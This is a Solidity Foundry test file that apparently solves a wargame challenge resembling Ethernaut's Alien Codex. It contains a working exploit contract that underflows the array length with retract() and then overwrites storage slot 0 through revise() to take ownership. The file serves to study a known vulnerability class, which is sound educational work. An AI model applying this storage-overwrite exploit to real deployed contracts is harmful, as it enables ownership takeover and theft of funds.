// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract AlienTest is Test {
    IAlien alien = IAlien(0xE577B1f94B13239d2B15A7c3881ebff125EFe6a4);

    address attacker = makeAddr("attacker");

    function setUp() public {
    }

    function test() public {
        bytes32 slot0 = vm.load(address(alien), bytes32(0));
        console2.log(address(uint160(uint256(slot0))));

        alien.makeContact();
        alien.retract();
        uint256 slotPos = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(address(1))));
        alien.revise(slotPos, content);

        bytes32 slot = vm.load(address(alien), bytes32(slotPos));
        console2.log("slotPos: ", slotPos);
        console2.log(address(uint160(uint256(slot))));

        slot0 = vm.load(address(alien), bytes32(0));
        console2.log("slot0: ", address(uint160(uint256(slot0))));

        unchecked {
            // console2.log(type(uint256).max - uint256(keccak256(abi.encode(1))));
        }


        // bytes32 slot1 = vm.load(address(alien), bytes32(uint256(1)));
        // unchecked {
        //     console2.log(type(uint256).max - uint256(keccak256(abi.encode(1))) + uint256(keccak256(abi.encode(1))) + 1);
        // }
    }

    function test_exploiter_contract() public {
        AlienExploiter exploiter = new AlienExploiter(address(alien));
        vm.prank(address(1));
        exploiter.exploit();
    }
}

interface IAlien {
    function owner() external returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienExploiter {
    IAlien public immutable alien;

    constructor(address _instance) {
        alien = IAlien(_instance);
    }

    function exploit() external {
        alien.makeContact();
        alien.retract();
        uint256 slotPos = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(address(msg.sender))));
        alien.revise(slotPos, content);

        require(alien.owner() == msg.sender);
    }
}